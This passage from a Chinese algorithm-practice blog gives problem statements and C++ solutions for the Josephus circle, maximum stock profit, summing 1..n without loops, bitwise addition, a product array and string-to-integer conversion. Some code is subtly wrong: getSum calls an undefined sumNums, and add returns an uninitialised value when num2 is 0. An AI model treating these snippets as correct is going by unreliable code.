mathnormal">n</span></span></span></span> 个数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>&gt;</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n&gt;0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> 排成一个圆圈，从数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 开始每次从这个圆圈里删除第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个数字。</p><p>求出这个圆圈里剩下的最后一个数字。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>4000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 4000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入：n=5 , m=3输出：3</code></pre><h3 id="约瑟夫环问题">约瑟夫环问题</h3><p>采用递归方法解决此问题, 旧坐标系中f(n, m)问题转化为新坐标系f(n - 1, m)问题<br>新坐标系起点 在 旧坐标系中下标为m, 因此点在旧坐标系中坐标 = (在新坐标系中坐标 + m) % n</p><p>时间复杂度为 $ O(n)$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> (<span class="built_in">lastRemaining</span>(n - <span class="number">1</span>, m) + m) % n;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="股票的最大利润★"><a href="https://www.acwing.com/problem/content/79/">股票的最大利润★</a></h2><p>假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖 <strong>一次</strong> 该股票可能获得的利润是多少？</p><p>例如一只股票在某些时间节点的价格为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>9</mn><mo separator="true">,</mo><mn>11</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>12</mn><mo separator="true">,</mo><mn>16</mn><mo separator="true">,</mo><mn>14</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[9, 11, 8, 5, 7, 12, 16, 14]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">11</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">16</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">14</span><span class="mclose">]</span></span></span></span>。</p><p>如果我们能在价格为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 的时候买入并在价格为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">16</span></span></span></span> 时卖出，则能收获最大的利润 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>。</p><p><strong>数据范围</strong></p><p>输入数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[9, 11, 8, 5, 7, 12, 16, 14]输出：11</code></pre><h3 id="模拟法-4">模拟法</h3><p>如何枚举: 以哪天卖出进行枚举<br>如何求前i天的最小值: 维护一个变量minv记录前i天的最小进价</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">maxDiff</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>, minv = nums[<span class="number">0</span>];  <span class="comment">// 最低进价初始化为nums[0], 而非0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      res = <span class="built_in">max</span>(res, nums[i] - minv);</span><br><span class="line">      minv = <span class="built_in">min</span>(minv, nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="求1-2-…-n★"><a href="https://www.acwing.com/problem/content/80/">求1+2+…+n★</a></h2><p>求 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>+</mo><mn>2</mn><mo>+</mo><mo>…</mo><mo>+</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1+2+…+n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，要求不能使用乘除法、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">for</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">while</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">hi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">if</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">else</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">se</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>w</mi><mi>i</mi><mi>t</mi><mi>c</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">switch</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">case</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal">se</span></span></span></span> 等关键字及条件判断语句 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">?</mo><mi>B</mi><mo>:</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(A?B:C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">?</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span>。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>50000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 50000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">50000</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：10输出：55</code></pre><h3 id="语法题">语法题</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getSum</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    n &gt; <span class="number">0</span> &amp;&amp; (n += <span class="built_in">sumNums</span>(n - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="不用加减乘除做加法★"><a href="https://www.acwing.com/problem/content/81/">不用加减乘除做加法★</a></h2><p>写一个函数，求两个整数之和，要求在函数体内不得使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>＋、－、</mtext><mo>×</mo><mtext>、</mtext><mo>÷</mo></mrow><annotation encoding="application/x-tex">＋、－、×、÷</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">＋、－、</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">、</span><span class="mord">÷</span></span></span></span> 四则运算符号。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1000</mn><mo>≤</mo><mi>n</mi><mi>u</mi><mi>m</mi><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mi>u</mi><mi>m</mi><mn>2</mn><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le num1,num2 \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入：num1 = 1 , num2 = 2输出：3</code></pre><h3 id="算法">算法</h3><p><strong>思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1) 全加器的实现</span><br><span class="line">    A   A 0 1 0 1</span><br><span class="line">+   B   B 0 0 1 1</span><br><span class="line">-----   C 0 1 1 0  </span><br><span class="line">  C D   D 0 0 0 1</span><br><span class="line">即</span><br><span class="line">C = A ^ B        异或</span><br><span class="line">D = (A &amp; B) &lt;&lt; 1 与, 左移1位</span><br><span class="line">运算可并行计算</span><br><span class="line"></span><br><span class="line">2) A + B = sum + carry, 并且循环可结束. 结束时carry=0, sum = A + B</span><br><span class="line">若num1 &amp; num2结果末尾中有k个0, 则num2 = (num1 &amp; num2) &lt;&lt; 1末尾有k+1个0</span><br><span class="line">下一次循环中(num1 &amp; num2) &lt;&lt; 1至少有k+2个0, ...</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum, carry;</span><br><span class="line">    <span class="keyword">while</span> (num2) &#123;</span><br><span class="line">      sum = num1 ^ num2;</span><br><span class="line">      carry = (num1 &amp; num2) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">      num1 = sum;</span><br><span class="line">      num2 = carry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="构建乘积数组★"><a href="https://www.acwing.com/problem/content/82/">构建乘积数组★</a></h2><p>给定一个数组<code>A[0, 1, …, n-1]</code>，请构建一个数组<code>B[0, 1, …, n-1]</code>，其中B中的元素<code>B[i]=A[0]×A[1]× … ×A[i-1]×A[i+1]× … ×A[n-1]</code>。</p><p>不能使用除法。</p><p><strong>数据范围</strong></p><p>输入数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>20</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,20]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1, 2, 3, 4, 5]输出：[120, 60, 40, 30, 24]</code></pre><p><strong>思考题</strong>：</p><ul><li>能不能只使用常数空间？（除了输出的数组之外）</li></ul><h3 id="曲线救国">曲线救国</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">multiply</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">B</span><span class="params">(n)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// B[i] = (A[0]×A[1]×… ×A[i-1]) × (A[i+1]×…×A[n-1]), 曲线救国, 分两步走</span></span><br><span class="line">    <span class="comment">// 此循环中p记录的是B[i]左半部分乘积</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, p = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">      B[i] = p;</span><br><span class="line">      p *= A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 此循环中p记录的是B[i]右边部分乘积</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>, p = <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      B[i] *= p;</span><br><span class="line">      p *= A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> B;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="把字符串转换成整数"><a href="https://www.acwing.com/problem/content/83/">把字符串转换成整数</a></h2><p>请你写一个函数 StrToInt，实现把字符串转换成整数这个功能。</p><p>当然，不能使用 atoi 或者其他类似的库函数。</p><p><strong>数据范围</strong></p><p>输入字符串长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>20</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,20]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：&quot;123&quot;输出：123</code></pre><p><strong>注意</strong>:</p><p>你的函数应满足下列条件：</p><ol><li>忽略所有行首空格，找到第一个非空格字符，可以是 ‘+/−’ 表示是正数或者负数，紧随其后找到最长的一串连续数字，将其解析成一个整数；</li><li>整数后可能有任意非数字字符，请将其忽略；</li><li>如果整数长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，则返回 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>；</li><li>如果整数大于 INT_MAX(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31} − 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>)，请返回 INT_MAX；如果整数小于INT_MIN(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">−2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span></span></span></span>) ，请返回 INT_MIN；</li></ol><h3 id="题解-13">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">strToInt</span><span class="params">(string str)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; str.<span class="built_in">size</span>() &amp;&amp; str[k] == <span class="string">&#x27; &#x27;</span>) k++;</span><br><span class="line">    </span><br><span class="line">    <span class="type">bool</span> is_minus = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (str[k] == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">      k++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (str[k] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      is_minus = <span class="literal">true</span>;</span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; str.<span class="built_in">size</span>() &amp;&amp; str[k] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; str[k] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">      num = <span class="number">10</span> * num + str[k] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (num &gt; INT_MAX) <span class="keyword">break</span>;</span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_minus) num *= <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (num &gt; INT_MAX) <span class="keyword">return</span> INT_MAX;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; INT_MIN) <span class="keyword">return</span> INT_MIN;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 